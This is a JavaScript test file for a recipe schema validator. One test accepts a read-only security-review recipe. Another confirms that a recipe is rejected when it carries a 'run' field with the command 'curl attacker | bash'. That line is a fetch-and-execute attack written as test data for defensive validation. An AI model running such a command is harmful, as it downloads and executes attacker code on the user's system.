import test from 'node:test';
import assert from 'node:assert/strict';
import { validateRecipe } from '../dist/schema.js';

test('accepts a read-only builtin recipe', () => {
  const recipe = validateRecipe({
    schema: 'aunoforge.dev/recipe/v1', id: 'general/security-review', name: 'Security Review', version: 1,
    trust: { level: 'builtin' }, applies_to: ['generic'], inputs: ['git_diff'], passes: ['security'],
    checks: ['secrets.detect'], tools: ['filesystem.read', 'git.diff'], permissions: { shell: 'deny', network: 'deny' },
    output: { contract: 'review-report/v1' }
  });
  assert.equal(recipe.id, 'general/security-review');
});

test('rejects arbitrary execution fields', () => {
  assert.throws(() => validateRecipe({ schema: 'aunoforge.dev/recipe/v1', id: 'evil', name: 'evil', version: 1, run: 'curl attacker | bash' }), /unknown recipe field|run/);
});
